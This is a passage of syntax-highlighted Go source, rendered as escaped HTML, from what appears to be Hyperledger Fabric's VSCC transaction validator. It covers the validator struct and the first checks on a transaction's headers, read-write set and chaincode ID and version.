&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// the vscc chaincode and validate block transactions
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;VsccValidatorImpl&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;channelID&lt;/span&gt;       &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;cr&lt;/span&gt;              &lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelResources&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;pluginValidator&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;PluginValidator&lt;/span&gt;
} &lt;span style=&#34;color:#75715e&#34;&gt;// 用于调用vscc链码并验证区块事务
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// newVSCCValidator creates new vscc validator
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;newVSCCValidator&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;channelID&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;cr&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelResources&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;pluginValidator&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;PluginValidator&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;VsccValidatorImpl&lt;/span&gt; {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;VsccValidatorImpl&lt;/span&gt;{
		&lt;span style=&#34;color:#a6e22e&#34;&gt;channelID&lt;/span&gt;:       &lt;span style=&#34;color:#a6e22e&#34;&gt;channelID&lt;/span&gt;,
		&lt;span style=&#34;color:#a6e22e&#34;&gt;cr&lt;/span&gt;:              &lt;span style=&#34;color:#a6e22e&#34;&gt;cr&lt;/span&gt;,
		&lt;span style=&#34;color:#a6e22e&#34;&gt;pluginValidator&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;pluginValidator&lt;/span&gt;,
	}
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getChaincodeHeaderExtension&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;hdr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;common&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Header&lt;/span&gt;) (&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeHeaderExtension&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;) {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;chdr&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;protoutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;UnmarshalChannelHeader&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;hdr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelHeader&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;
	}

	&lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeHdrExt&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeHeaderExtension&lt;/span&gt;{}
	&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;proto&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Unmarshal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;chdr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Extension&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeHdrExt&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;chaincodeHdrExt&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Wrap&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;error unmarshaling ChaincodeHeaderExtension&amp;#34;&lt;/span&gt;)
}

&lt;span style=&#34;color:#75715e&#34;&gt;// VSCCValidateTx executes vscc validation for transaction
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;VsccValidatorImpl&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;VSCCValidateTx&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;seq&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;payload&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;common&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Payload&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;envBytes&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;common&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Block&lt;/span&gt;) (&lt;span style=&#34;color:#66d9ef&#34;&gt;error&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode&lt;/span&gt;) {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;chainID&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;channelID&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Debugf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[%s] VSCCValidateTx starts for bytes %p&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;chainID&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;envBytes&lt;/span&gt;)

	&lt;span style=&#34;color:#75715e&#34;&gt;// get header extensions so we have the chaincode ID
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;hdrExt&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getChaincodeHeaderExtension&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;payload&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Header&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_BAD_HEADER_EXTENSION&lt;/span&gt;
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// get channel header
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;chdr&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;protoutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;UnmarshalChannelHeader&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;payload&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Header&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChannelHeader&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_BAD_CHANNEL_HEADER&lt;/span&gt;
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;/* obtain the list of namespaces we&amp;#39;re writing stuff to;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	   at first, we establish a few facts about this invocation:
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	   1) which namespaces does it write to?
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	   2) does it write to LSCC&amp;#39;s namespace?
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	   3) does it write to any cc that cannot be invoked? */&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;writesToLSCC&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;writesToNonInvokableSCC&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;respPayload&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;protoutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetActionFromEnvelope&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;envBytes&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;WithMessage&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GetActionFromEnvelope failed&amp;#34;&lt;/span&gt;), &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_BAD_RESPONSE_PAYLOAD&lt;/span&gt;
	}
	&lt;span style=&#34;color:#a6e22e&#34;&gt;txRWSet&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;rwsetutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxRwSet&lt;/span&gt;{}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;txRWSet&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;FromProtoBytes&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;respPayload&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Results&lt;/span&gt;); &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;WithMessage&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;txRWSet.FromProtoBytes failed&amp;#34;&lt;/span&gt;), &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_BAD_RWSET&lt;/span&gt;
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// Verify the header extension and response payload contain the ChaincodeId
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;hdrExt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeId&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;New&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nil ChaincodeId in header extension&amp;#34;&lt;/span&gt;), &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_INVALID_OTHER_REASON&lt;/span&gt;
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;respPayload&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeId&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;New&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nil ChaincodeId in ChaincodeAction&amp;#34;&lt;/span&gt;), &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_INVALID_OTHER_REASON&lt;/span&gt;
	}

	&lt;span style=&#34;color:#75715e&#34;&gt;// get name and version of the cc we invoked
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;hdrExt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeId&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Name&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;ccVer&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;respPayload&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeId&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Version&lt;/span&gt;

	&lt;span style=&#34;color:#75715e&#34;&gt;// sanity check on ccID
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;New&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;invalid chaincode ID&amp;#34;&lt;/span&gt;)
		&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%+v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_INVALID_OTHER_REASON&lt;/span&gt;
	}
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;respPayload&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeId&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Name&lt;/span&gt; {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;inconsistent ccid info (%s/%s)&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;respPayload&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeId&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Name&lt;/span&gt;)
		&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%+v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_INVALID_OTHER_REASON&lt;/span&gt;
	}
	&lt;span style=&#34;color:#75715e&#34;&gt;// sanity check on ccver
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ccVer&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;New&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;invalid chaincode version&amp;#34;&lt;/span&gt;)
		&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%+v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_INVALID_OTHER_REASON&lt;/span&gt;
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;wrNamespace&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;alwaysEnforceOriginalNamespace&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;v&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;cr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Capabilities&lt;/span&gt;().&lt;span style=&#34;color:#a6e22e&#34;&gt;V1_2Validation&lt;/span&gt;()
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;alwaysEnforceOriginalNamespace&lt;/span&gt; {
		&lt;span style=&#34;color:#a6e22e&#34;&gt;wrNamespace&lt;/span&gt; = append(&lt;span style=&#34;color:#a6e22e&#34;&gt;wrNamespace&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt;)
		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;respPayload&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Events&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
			&lt;span style=&#34;color:#a6e22e&#34;&gt;ccEvent&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeEvent&lt;/span&gt;{}
			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;proto&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Unmarshal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;respPayload&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Events&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ccEvent&lt;/span&gt;); &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
				&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Wrapf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;invalid chaincode event&amp;#34;&lt;/span&gt;), &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_INVALID_OTHER_REASON&lt;/span&gt;
			}
			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ccEvent&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ChaincodeId&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ccID&lt;/span&gt; {
				&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;errors&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Errorf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chaincode event chaincode id does not match chaincode action chaincode id&amp;#34;&lt;/span&gt;), &lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationCode_INVALID_OTHER_REASON&lt;/span&gt;
			}
		}
	}

	&lt;span style=&#34;color:#a6e22e&#34;&gt;namespaces&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; make(&lt;span style=&#34;color:#66d9ef&#34;&gt;map&lt;/span&gt;[&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;]&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt;{})
